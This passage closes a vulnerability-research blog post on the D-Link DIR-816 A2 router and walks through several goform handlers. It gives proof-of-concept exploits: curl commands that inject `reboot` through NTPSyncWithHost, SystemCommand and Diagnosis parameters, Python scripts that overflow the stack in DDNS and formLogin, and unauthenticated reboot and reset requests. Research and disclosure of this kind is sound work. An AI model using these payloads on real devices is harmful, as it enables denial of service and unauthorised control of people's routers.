<h3 id="NTPSyncWithHost"><a href="#NTPSyncWithHost" class="headerlink" title="NTPSyncWithHost"></a>NTPSyncWithHost</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/15.png" style="zoom:50%;">

<p>Directly pass in the parameters to execute the command</p>
<p>如下poc即可reboot</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/goform/NTPSyncWithHost -d tokenid=xxxxx -d <span class="string">'`reboot`'</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="DDNS"><a href="#DDNS" class="headerlink" title="DDNS"></a>DDNS</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/16.png" style="zoom:50%;">

<p>The password is assigned to v7, and the v7 base64 will be stored in v11 after decryption, but the size of the password is not checked here, resulting in stack overflow</p>
<p>如下poc即可crash</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">tokenid = <span class="string">'1804289383'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.0.1/goform/DDNS'</span></span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(<span class="string">b'a'</span> * <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tokenid'</span> : tokenid,</span><br><span class="line">    <span class="string">'enable'</span> : <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'hostname'</span> : <span class="string">'DDNS'</span>,</span><br><span class="line">    <span class="string">'username'</span> : <span class="string">'123'</span>,</span><br><span class="line">    <span class="string">'password'</span> : payload</span><br><span class="line">}</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">response.encoding=<span class="string">"utf-8"</span></span><br><span class="line">info = response.text</span><br><span class="line">li(url)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br></pre></td></tr></tbody></table></figure>

<h3 id="formLogin"><a href="#formLogin" class="headerlink" title="formLogin"></a>formLogin</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/17.png" style="zoom:50%;">

<p>After the username and password are decrypted by base64, they will be stored in the stack of the program without checking the size, resulting in a stack overflow vulnerability.</p>
<p>如下poc即可crash</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">tokenid = <span class="string">'1804289383'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.0.1/goform/formLogin'</span></span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(<span class="string">b'a'</span> * <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tokenid'</span> : tokenid,</span><br><span class="line">    <span class="string">'username'</span> : payload,</span><br><span class="line">    <span class="string">'password'</span> : payload</span><br><span class="line">}</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">response.encoding=<span class="string">"utf-8"</span></span><br><span class="line">info = response.text</span><br><span class="line">li(url)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br></pre></td></tr></tbody></table></figure>

<h3 id="SystemCommand"><a href="#SystemCommand" class="headerlink" title="SystemCommand"></a>SystemCommand</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/18.png" style="zoom:50%;">

<p>After the user passes in the command parameter, it will be spliced into byte_4836B0 by snprintf, and finally doSystem(&amp;byte_4836B0); will be executed, resulting in a command injection vulnerability</p>
<p>如下poc即可reboot</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/goform/SystemCommand -d tokenid=xxxx -d <span class="string">'command=`reboot`'</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="LoadDefaultSettings"><a href="#LoadDefaultSettings" class="headerlink" title="LoadDefaultSettings"></a>LoadDefaultSettings</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/19.png" style="zoom:50%;">

<p>system(“reboot”); will be executed anyway</p>
<p>如下poc即可reboot</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/goform/LoadDefaultSettings -d tokenid=xxxx</span><br></pre></td></tr></tbody></table></figure>

<h3 id="Diagnosis"><a href="#Diagnosis" class="headerlink" title="Diagnosis"></a>Diagnosis</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/2o.png" style="zoom:50%;">

<p>After the if condition is met, setnum will be spliced into v10 by snprintf, and finally system will be executed, resulting in a command injection vulnerability</p>
<p>如下poc即可reboot</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/goform/Diagnosis -d tokenid=xxxx -d <span class="string">'pingAddr=192.168.0.1'</span> -d <span class="string">'sendNum=`reboot`'</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="wizard-end"><a href="#wizard-end" class="headerlink" title="wizard_end"></a>wizard_end</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/20.png" style="zoom:50%;">

<p>Initialize the network without authentication</p>
<p>如下poc即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/goform/wizard_end -d tokenid=xxxx</span><br></pre></td></tr></tbody></table></figure>

<p>至此，该型号路由器二进制层面的漏洞笔者已经分析完成</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>拿下9个cve，学习到了mips漏洞利用，路由器漏洞挖掘，uart串口调试</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">D-Link Dir-816 A2路由器漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8F%8A%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">固件下载及提取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#goahead-main%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">goahead main程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#formDefineInternet"><span class="toc-number">1.3.</span> <span class="toc-text">formDefineInternet</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#addassignment"><span class="toc-number">1.3.1.</span> <span class="toc-text">addassignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#editassignment"><span class="toc-number">1.3.2.</span> <span class="toc-text">editassignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#form2Wan-cgi"><span class="toc-number">1.3.3.</span> <span class="toc-text">form2Wan.cgi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setMac"><span class="toc-number">1.3.4.</span> <span class="toc-text">setMac</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#addRouting"><span class="toc-number">1.3.5.</span> <span class="toc-text">addRouting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setNetworkLan"><span class="toc-number">1.3.6.</span> <span class="toc-text">setNetworkLan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#form2Dhcpip-cgi"><span class="toc-number">1.3.7.</span> <span class="toc-text">form2Dhcpip.cgi</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#formDefineUtilities"><span class="toc-number">1.4.</span> <span class="toc-text">formDefineUtilities</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#form2Reboot-cgi"><span class="toc-number">1.4.1.</span> <span class="toc-text">form2Reboot.cgi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#doReboot"><span class="toc-number">1.4.2.</span> <span class="toc-text">doReboot</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#form-define-ip-control"><span class="toc-number">1.5.</span> <span class="toc-text">form_define_ip_control</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#form2IPQoSTcAdd"><span class="toc-number">1.5.1.</span> <span class="toc-text">form2IPQoSTcAdd</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#formDefineFirewall"><span class="toc-number">1.6.</span> <span class="toc-text">formDefineFirewall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#websHostFilter"><span class="toc-number">1.6.1.</span> <span class="toc-text">websHostFilter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#websURLFilter"><span class="toc-number">1.6.2.</span> <span class="toc-text">websURLFilter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#websURLFilterAddDel"><span class="toc-number">1.6.3.</span> <span class="toc-text">websURLFilterAddDel</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#formDefineManagement"><span class="toc-number">1.7.</span> <span class="toc-text">formDefineManagement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#form2userconfig-cgi"><span class="toc-number">1.7.1.</span> <span class="toc-text">form2userconfig.cgi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setSysAdm"><span class="toc-number">1.7.2.</span> <span class="toc-text">setSysAdm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#form2systime-cgi"><span class="toc-number">1.7.3.</span> <span class="toc-text">form2systime.cgi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTPSyncWithHost"><span class="toc-number">1.7.4.</span> <span class="toc-text">NTPSyncWithHost</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DDNS"><span class="toc-number">1.7.5.</span> <span class="toc-text">DDNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#formLogin"><span class="toc-number">1.7.6.</span> <span class="toc-text">formLogin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SystemCommand"><span class="toc-number">1.7.7.</span> <span class="toc-text">SystemCommand</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LoadDefaultSettings"><span class="toc-number">1.7.8.</span> <span class="toc-text">LoadDefaultSettings</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Diagnosis"><span class="toc-number">1.7.9.</span> <span class="toc-text">Diagnosis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wizard-end"><span class="toc-number">1.7.10.</span> <span class="toc-text">wizard_end</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">小结</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;text=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;title=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;is_video=false&amp;description=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=D-Link Dir-816 A2路由器漏洞分析&amp;body=Check out this article: https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;title=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;title=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;title=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;title=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;name=D-Link Dir-816 A2路由器漏洞分析&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;t=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright ©
    
    
    2021-2024
    z1r0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->



<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>